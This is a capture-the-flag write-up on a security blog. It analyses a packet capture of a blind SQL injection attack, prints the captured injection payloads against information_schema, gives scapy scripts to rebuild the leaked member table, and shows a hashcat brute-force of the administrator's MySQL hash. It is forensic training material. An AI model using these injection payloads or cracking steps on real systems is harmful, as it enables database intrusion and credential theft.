<!DOCTYPE html>
<html>
    <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width initial-scale=1">

  <title>CodeGate 2012 Quals &#8211; Network 400</title>
  <meta name="description" content="Challenge">
  <link rel="stylesheet" href="/assets/bootstrap.css">
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="http://localhost:8000/ctf%20-%20clgt%20crew/2012/03/01/codegate-2012-quals-network-400.html">
  <link rel="alternate" type="application/atom+xml" title="VNSecurity" href="http://localhost:8000/feed.xml" />
  <script type="text/javascript" src='//ajax.googleapis.com/ajax/libs/webfont/1.4.7/webfont.js?ver=3.9.2'></script>
  <script type="text/javascript" src="/assets/jquery.js"></script>
  <script type="text/javascript" src="/assets/jquery.caroufredsel-6.0.4-packed.js"></script>
  <script type="text/javascript">
    // WebFont.load({
    //     google: {
    //         families: ['Source+Sans+Pro','Open+Sans::latin,vietnamese']
    //     }
    // });
  </script>
</head>

    <body>
        <div class="wrapper kopa-shadow">
            <div class="row-fluid">
                <header id="page-header">
    <div class="clearfix" id="header-top">

        <div class="kp-headline-wrapper clearfix">
            <h6 class="kp-headline-title">Breaking news<span></span></h6>
            <div class="kp-headline clearfix">
                <dl class="ticker-1 clearfix">
                    
                    <dd>
                        <a href="/headlines/2014/05/06/btalk-part-1.html">Phân tích ứng dụng Btalk trên Android &#8211; Phần một: Cơ chế xác thực người dùng</a>
                    </dd>
                    
                    <dd>
                        <a href="/headlines/2011/12/20/hoc-vien-sans-den-viet-nam.html">Học viện SANS đến Việt Nam 03/2012</a>
                    </dd>
                    
                    <dd>
                        <a href="/headlines/2011/12/16/hoi-thao-tet-2012.html">Hội thảo Tết 2012</a>
                    </dd>
                    
                </dl><!--ticker-1-->
            </div><!--kp-headline-->
        </div><!--kp-headline-wrapper-->

        <div class="social-search-box">

        </div>
        <!--social-search-box-->

    </div>
    <!--header-top-->

    <div class="clearfix" id="header-middle">
        <div id="logo-image">
            <a href="http://vnsec-new.cloudapp.net/wp">
                <img width="217" height="70" alt="VNSecurity Logo" src="/assets/logo.png">
            </a>
        </div>
        <div class="top-banner">


        </div>
        <!--top-banner-->

    </div>

    <!--header-middle-->

    <div id="header-bottom">
        <nav id="main-nav">
            <ul class="menu clearfix sf-js-enabled sf-arrows" id="main-menu">
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    <a href="/">Home</a>
                </li>
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                |
                </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/headlines/">headlines</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/tutorials/">tutorials</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/research/">research</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/ctf-clgt-crew/">ctf - clgt crew</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/misc/">misc</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    <a href="/papers.html">Papers</a>
                </li>
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                |
                </li>                
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    <a href="/tools.html">Tools</a>
                </li>
            </ul>
        </nav>
        <!--main-nav-->
    </div>
    <div>
        
    </div>
    <!--header-bottom-->
</header>
                <div id="main-content">
                    <div class="post type-post status-publish format-standard hentry category-tin-tuc tag-android tag-btalk tag-mobile entry-box clearfix">

  <header class="post-header">
    <h4 class="entry-title">CodeGate 2012 Quals &#8211; Network 400</h4>
    <p class="post-meta">Mar 1, 2012 • pdah</p>
  </header>

  <article class="post-content">
    <p><strong>Challenge</strong></p>

<blockquote>
  <p>Because of vulnerability of site in Company A, database which contains user’s information was leaked. The file is dumped packet at the moment of attacking.<br />
Find the administrator’s account information which was leaked from the site.<br />
For reference, some parts of the packet was blind to XXXX.</p>

  <table>
    <tbody>
      <tr>
        <td>Answer : strupr(md5(database_name</td>
        <td>table_name</td>
        <td>decode(password_of_admin)))</td>
      </tr>
      <tr>
        <td>(‘</td>
        <td>’is just a character)</td>
        <td> </td>
      </tr>
    </tbody>
  </table>
</blockquote>

<p><a href="http://repo.shell-storm.org/CTF/CodeGate-2012/Network400/80924D4296FCBE81EA5F09CF60542AE7">http://repo.shell-storm.org/CTF/CodeGate-2012/Network400/80924D4296FCBE81EA5F09CF60542AE7</a></p>

<p><strong>Summary</strong></p>

<p>Given a pcap file (again) captured from an attack, we need to find information about database name, table name, administrator’s password in plaintext.<br />
This challenge requires basic network analysis skill, some knowledge of Blind SQL Injection and password recovery tools.</p>

<p><strong>Solution</strong></p>

<p>Browsing the pcap file using wireshark, this is obviously a Blind SQL Injection attack.</p>

<pre class="brush: plain; gutter: false; highlight: [1,15,19,33]; title: ; notranslate" title="">GET /sc/id_check.php?name=music%27%20AND%20%27Ohavy%27=%27Ohavyy HTTP/1.1
Accept-Encoding: identity
Accept-Language: en-us,en;q=0.5
Host: www.cdgate.xxx
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.15)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close

HTTP/1.1 200 OK
Date: Wed, 22 Feb 2012 09:01:54 GMT
Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g
X-Powered-By: PHP/5.2.6-2ubuntu4.1
Vary: Accept-Encoding
Content-Length: 0
Connection: close
Content-Type: text/html

GET /sc/id_check.php?name=music%27%20AND%20%27Ohavy%27=%27Ohavy HTTP/1.1
Accept-Encoding: identity
Accept-Language: en-us,en;q=0.5
Host: www.cdgate.xxx
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.15)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close

HTTP/1.1 200 OK
Date: Wed, 22 Feb 2012 09:01:54 GMT
Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g
X-Powered-By: PHP/5.2.6-2ubuntu4.1
Vary: Accept-Encoding
Content-Length: 4
Connection: close
Content-Type: text/html
</pre>

<p>Some first requests are just for checking the responses of server to some random injected queries. We can easily notice that if the expressions in injected queries return False, HTTP response will have <strong>“Content-Length: 0”</strong>, otherwise the expressions return True. Another thing is that all the attacking queries had the same pattern of <strong>… [EXPRESSION] &gt; [VALUE] …</strong> As the operators were all ‘&gt;’, for each [EXPRESSION] we only need to catch the last [VALUE] of ‘False’ responses.</p>

<p>We created a python script to parse this pcap file:</p>

<pre class="brush: python; title: ; notranslate" title="">import sys
from scapy.all import *
import urllib, string

packets = rdpcap("network400")
len_packets = len(packets)
l1 = []
l2 = []
i = 0
while i &lt; len_packets:
    if 'Raw' in packets[i] and packets[i].payload.dst == '192.168.1.41':
        l1.append(urllib.unquote(str(packets[i]['Raw']).split("r")[0]))
        while True:
            i+=1
            if 'Raw' in packets[i]:
                if packets[i].payload.dst == '192.168.1.8':
                    content = str(packets[i]['Raw'])
                    if 'Content-Length: 0' in content:
                        l2.append(False)
                    else:
                        l2.append(True)
                    break
    i+=1
for i in range(len(l1)):
    print l1[i]
    print l2[i]
</pre>

<p>Here’s a part of the output:</p>

<blockquote>
  <p>…<br />
GET /sc/id_check.php?name=music’ AND CONNECTION_ID()=CONNECTION_ID() AND ‘YOxWw’=’YOxWw HTTP/1.1<br />
True<br />
GET /sc/id_check.php?name=music’ AND ISNULL(1/0) AND ‘wSwEm’=’wSwEm HTTP/1.1<br />
True<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 1, 1)) &gt; 51 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
True<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 1, 1)) &gt; 54 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
True<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 1, 1)) &gt; 56 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
False<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 1, 1)) &gt; 55 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
False<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 2, 1)) &gt; 51 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
False<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 2, 1)) &gt; 48 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
False<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 2, 1)) &gt; 1 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
False<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR(10000)), CHAR(32)) FROM information_schema.SCHEMATA), 1, 1)) &gt; 51 AND ‘yFdDA’=’yFdDA HTTP/1.1<br />
False<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR(10000)), CHAR(32)) FROM information_schema.SCHEMATA), 1, 1)) &gt; 48 AND ‘yFdDA’=’yFdDA HTTP/1.1<br />
True<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR(10000)), CHAR(32)) FROM information_schema.SCHEMATA), 1, 1)) &gt; 49 AND ‘yFdDA’=’yFdDA HTTP/1.1<br />
True<br />
…</p>
</blockquote>

<p>We extended the script to print out only the leaked characters</p>

<pre class="brush: python; title: ; notranslate" title="">import sys
from scapy.all import *
import urllib
packets = rdpcap("network400")
len_packets = len(packets)

cur_s = None
last_false_value = None
result = ""
i=0
while i &lt; len_packets:
    if ('Raw' in packets[i]) and (packets[i].payload.dst == '192.168.1.41'):
        query = urllib.unquote(str(packets[i]['Raw']).split("r")[0])
        if "&gt;" in query:
            s,v = query.split("&gt;")
            v=chr(int(v.strip().split(" ")[0]))
            if cur_s != s and last_false_value != None:
                result+= last_false_value
            cur_s = s
        else:
            v = None
        while True:
            i+=1
            if 'Raw' in packets[i]:
                if packets[i].payload.dst == '192.168.1.8':
                    content = str(packets[i]['Raw'])
                    if 'Content-Length: 0' in content:
                        last_false_value = v
                    break

    i+=1
print result
</pre>

<p>The output looks better (but lack of information about queries):</p>

<pre class="brush: plain; gutter: false; highlight: [82,83,84,85,86,87]; title: ; notranslate" title="">2
information_schema
cdgate
17
CHARACTER_SETS
COLLATIONS
COLLATION_CHARACTER_SET_APPLICABILITY
COLUMNS
COLUMN_PRIVILEGES
KEY_COLUMN_USAGE
PROFILING
ROUTINES
SCHEMATA
SCHEMA_PRIVILEGES
STATISTICS
TABLES
TABLE_CONSTRAINTS
TABLE_PRIVILEGES
TRIGGERS
USER_PRIVILEGES
VIEWS
1
member
3
cdgate
6
name
id
email
sex
level
passwd
11
monitor@cdgate.xxx
08b5411f848a2581a41672a759c87380
2
monitor
*1763CA06A6BF4E96A671D674E855043A9C7886B2
f
apple@cdgate.xxx
apple
3
apple
*C5404E97FF933A91C48743E0C4063B2774F052DD
m
music@cdgate.xxx
music
6
music
*DBA29A581E9689455787B273C91D77F03D7FAD5B
m
computer@cdgate.xxx
computer
2
computer
*8E4ADF66627261AC0DE1733F55C7A0B72EC113FB
f
com@cdgate.xxx
com
3
com
*FDDA9468184E298A054803261A4753FF4657E889
f
lyco@cdgate.xxx
lynco
4
*EEFD19E63FA33259154630DE24A2B17772FAC630
*0ECBFBFE8116C7612A537E558FB7BE1293576B78
f
mouse@cdgate.xxx
mouse
4
*87A5750BB01F1E52060CF8EC90FB1344B1D413AA
*6FF638106693EF27772523B0D5C9BFAF4DD292F1
m
root@cdgate.xxx
root
6
root
*300102BEB9E4DABEB8BD60BB9BB6686A6272C787
f
desktop@cdgate.xxx
desktop
1
desktop
*DDD9B83818DB7B634C88AD49396F54BD0DE31677
f
www@cdgate.xxx
4eae35f1b35977a00ebd8086c259d4c9
8
www
*3E8563E916A490A13918AF7385B8FF865C221039
f
notebook@cdgate.xxx
notebook
8
fb5d1b4a2312e239652b13a24ed9a74f
*18DF7FA3EE218ACB28E69AF1D643091052A95887
m
</pre>

<p>By combining outputs of these 2 scripts we could see that database is <strong>cdgate</strong> and table name is <strong>member</strong>. These information were followed by a number of member records, the value for each record were in order of email, id, level, name, password, sex. There was only one user desktop@cdgate.xxx with level=1, the password was hashed hence we let hashcat do the rest:</p>

<pre class="brush: bash; gutter: false; title: ; notranslate" title="">$ echo DDD9B83818DB7B634C88AD49396F54BD0DE31677 &gt; hash
$ ./hashcat-cli64.bin -m300 -a3 --bf-cs-buf=abcdefghijklmnopqrstuvwxyz0123456789 hash outdir
................
Charset...: abcdefghijklmnopqrstuvwxyz0123456789
Length....: 6
Index.....: 0/1 (segment), 2176782336 (words), 0 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: - plains, 13.99M words
Progress..: 1360425204/2176782336 (62.50%)
Running...: 00:00:01:37
Estimated.: 00:00:00:58
ddd9b83818db7b634c88ad49396f54bd0de31677:etagcd
All hashes have been recovered
</pre>

<p>Bingo! The password is <strong>etagcd</strong>, it’s time to build the flag:</p>

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">&gt;&gt;&gt; hashlib.md5('cdgate|member|etagcd').hexdigest().upper();
'AB6FCA7FFC88710CFBC37D5DF9A25F3F'
</pre>

  </article>

</div>

<hr/>
<h2>Comments</h2>
<div class="fb-comments" data-href="http://localhost:8000/ctf%20-%20clgt%20crew/2012/03/01/codegate-2012-quals-network-400.html" data-num-posts="4" data-width="706"></div>

                </div>
                <script type="text/javascript">
jQuery(function() {
    var _scroll = {
        delay: 1000,
        easing: 'linear',
        items: 1,
        duration: 0.07,
        timeoutDuration: 0,
        pauseOnHover: 'immediate'
    };
    jQuery('.ticker-1').carouFredSel({
        width: 1000,
        align: false,
        items: {
            width: 'variable',
            height: 40,
            visible: 1
        },
        scroll: _scroll
    });

    //  set carousels to be 100% wide
    jQuery('.caroufredsel_wrapper').css('width', '100%');
});
</script>
<script>
  (function() {
    var cx = '003844801333820630405:hlapfwpe2eq';
    var gcse = document.createElement('script');
    gcse.type = 'text/javascript';
    gcse.async = true;
    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
        '//www.google.com/cse/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(gcse, s);
  })();
</script>
<gcse:search></gcse:search>
<footer class="site-footer">

  <div class="wrapper">

    <div class="footer-col-wrapper">
      
    </div>

  </div>

</footer>

            </div>
        </div>
        <script>(function(d, s, id) {
          var js, fjs = d.getElementsByTagName(s)[0];
          if (d.getElementById(id)) return;
          js = d.createElement(s); js.id = id;
          js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=671572696275219";
          fjs.parentNode.insertBefore(js, fjs);
        }(document, "script", "facebook-jssdk"));</script>
    </body>
</html>